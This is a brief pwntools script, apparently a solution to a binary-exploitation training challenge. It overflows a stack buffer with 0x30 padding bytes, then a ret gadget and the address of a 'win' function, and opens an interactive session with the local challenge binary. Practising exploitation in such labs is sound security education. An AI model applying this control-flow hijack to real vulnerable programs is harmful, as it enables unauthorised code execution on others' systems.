from pwn import *
'''
Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''
ret_gadjet = 0x40101a
win_addr = 0x401b19
palyoad = 0x30 * b'A' + p64(ret_gadjet) +  p64(win_addr)
r = process('/challenge/binary-exploitation-control-hijack-w')
r.send(palyoad)
r.interactive()

